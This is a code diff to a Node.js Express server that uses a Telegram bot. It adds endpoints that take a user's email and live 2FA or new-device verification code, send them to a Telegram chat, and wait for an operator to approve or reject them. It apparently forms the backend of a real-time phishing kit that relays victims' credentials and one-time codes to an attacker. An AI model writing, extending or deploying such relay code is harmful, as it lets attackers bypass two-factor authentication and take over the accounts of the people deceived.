@@ -9,6 +9,7 @@ const port = Number(process.env.PORT || 3000);
 const botToken = process.env.BOT_TOKEN;
 const chatId = process.env.CHAT_ID;
 const loginDecisions = new Map();
+const verificationDecisions = new Map();
 
 if (!botToken || !chatId) {
   console.error('Missing BOT_TOKEN or CHAT_ID in environment variables.');
@@ -21,8 +22,8 @@ app.use(express.static(__dirname));
 
 bot.on('callback_query', async (query) => {
   const data = String(query.data || '');
-  const [, ...rest] = data.split(':');
-  const email = rest.join(':');
+  const [action, domain, emailAndRest] = data.split(':');
+  const email = data.includes(':') ? data.slice(data.indexOf(':') + 1).replace(/^approve:|^deny:|^verify:|^reject:/, '') : '';
 
   try {
     if (data.startsWith('approve:')) {
@@ -43,6 +44,30 @@ bot.on('callback_query', async (query) => {
         { chat_id: query.message.chat.id, message_id: query.message.message_id }
       );
       await bot.sendMessage(query.message.chat.id, `❌ Login denied for ${email || 'user'}.`);
+    }
+
+    if (data.startsWith('verify:')) {
+      const [, step, verificationEmail, verificationCode] = data.split(':');
+      const key = `${verificationEmail}:${step}`;
+      verificationDecisions.set(key, { status: 'approved', message: `${step.toUpperCase()} verified.` });
+      await bot.answerCallbackQuery(query.id, { text: 'Verified' });
+      await bot.editMessageReplyMarkup(
+        { inline_keyboard: [] },
+        { chat_id: query.message.chat.id, message_id: query.message.message_id }
+      );
+      await bot.sendMessage(query.message.chat.id, `✅ ${step.toUpperCase()} verification approved for ${verificationEmail || 'user'} (${verificationCode || 'code'}).`);
+    }
+
+    if (data.startsWith('reject:')) {
+      const [, step, verificationEmail, verificationCode] = data.split(':');
+      const key = `${verificationEmail}:${step}`;
+      verificationDecisions.set(key, { status: 'denied', message: `${step.toUpperCase()} verification denied.` });
+      await bot.answerCallbackQuery(query.id, { text: 'Rejected' });
+      await bot.editMessageReplyMarkup(
+        { inline_keyboard: [] },
+        { chat_id: query.message.chat.id, message_id: query.message.message_id }
+      );
+      await bot.sendMessage(query.message.chat.id, `❌ ${step.toUpperCase()} verification denied for ${verificationEmail || 'user'} (${verificationCode || 'code'}).`);
     }
   } catch (error) {
     console.error('Callback processing failed:', error.message);
@@ -134,6 +159,59 @@ app.get('/api/login-status', (req, res) => {
   }
 
   const decision = loginDecisions.get(email);
+
+  if (!decision) {
+    return res.json({ ok: true, status: 'pending' });
+  }
+
+  return res.json({ ok: true, status: decision.status, message: decision.message });
+});
+
+app.post('/api/send-verification', async (req, res) => {
+  const email = String(req.body?.email || '').trim();
+  const step = String(req.body?.step || '').trim();
+  const code = String(req.body?.code || '').trim();
+
+  if (!email || !step || !code) {
+    return res.status(400).json({ ok: false, message: 'Missing email, step, or code.' });
+  }
+
+  if (!botToken || !chatId) {
+    return res.status(500).json({ ok: false, message: 'Telegram bot is not configured.' });
+  }
+
+  const key = `${email}:${step}`;
+  verificationDecisions.delete(key);
+
+  const subject = step === '2fa' ? '2FA code verification' : 'new device verification';
+  const message = `Security validation required\n\nEmail: ${email}\nStep: ${subject}\nCode: ${code}\n\nApprove or reject this verification request.`;
+
+  try {
+    const sentMessage = await bot.sendMessage(chatId, message, {
+      reply_markup: {
+        inline_keyboard: [[
+          { text: 'Approve', callback_data: `verify:${step}:${email}:${code}` },
+          { text: 'Reject', callback_data: `reject:${step}:${email}:${code}` }
+        ]]
+      }
+    });
+
+    return res.json({ ok: true, messageId: sentMessage.message_id, email, step, status: 'pending' });
+  } catch (error) {
+    console.error('Failed to send verification request:', error.message);
+    return res.status(500).json({ ok: false, message: 'Could not send verification request.' });
+  }
+});
+
+app.get('/api/verification-status', (req, res) => {
+  const email = String(req.query.email || '').trim();
+  const step = String(req.query.step || '').trim();
+
+  if (!email || !step) {
+    return res.status(400).json({ ok: false, message: 'Missing email or step.' });
+  }
+
+  const decision = verificationDecisions.get(`${email}:${step}`);
 
   if (!decision) {
     return res.json({ ok: true, status: 'pending' });
